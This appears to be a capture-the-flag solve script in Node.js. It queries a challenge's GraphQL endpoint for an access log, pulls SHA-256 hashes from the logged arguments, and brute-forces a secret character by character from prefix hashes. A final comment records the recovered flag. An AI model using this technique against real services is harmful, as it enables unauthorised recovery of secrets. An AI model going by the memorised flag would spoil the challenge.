const axios = require('axios').default;
const qs = require('qs');
const crypto = require('crypto');


async function sendQuery(query, variables={}) {
  let res = await axios.post(
    'https://confessions.flu.xxx/graphql',
    {
      operationName: null,
      query,
      variables,
    }
  );
  return res.data;
}


async function digestMessage(message) {
  const msgUint8 = new TextEncoder().encode(message);                           // encode as (utf-8) Uint8Array
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);           // hash the message
  const hashArray = Array.from(new Uint8Array(hashBuffer));                     // convert buffer to byte array
  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join(''); // convert bytes to hex string
  return hashHex;
}


async function solve() {
  let hashChar = new Map();
  for (let i = 0x21; i < 0x7f; ++i) {
    const ch = String.fromCharCode(i);
    const hashHex = crypto.createHash('sha256').update(ch, 'utf8').digest('hex');
    hashChar.set(hashHex, ch);
  }

  let data = await sendQuery( "query { accessLog { timestamp, name, args } }");

  const getMessage = async (al) => {
    const m = al.args.match(/[0-9a-z]{64}/);
    if (!m)
      return "";
    const hash = m[0];
    const msgData = await sendQuery(
      "query Q($hash: String) { confession(hash: $hash) { title, hash, message } }",
      { hash },
    );
    return msgData.data.confession.hash;
  };
  const accessLog = data.data.accessLog;
  const hashes = await Promise.all(accessLog.map(getMessage));
  const flagHashes = hashes.filter((h) => { return h.length > 0; });

  let flag = '';
  for (let fh of flagHashes) {
    for (let i = 0x21; i < 0x7f; ++i) {
      const flagGuess = flag + String.fromCharCode(i);
      const fhg = crypto.createHash('sha256').update(flagGuess, 'utf8').digest('hex');
      if (fh === fhg) {
        flag = flagGuess;
        break;
      }
    }
    console.log(flag);
  }
}

solve();

// flag{but_pls_d0nt_t3ll_any1}
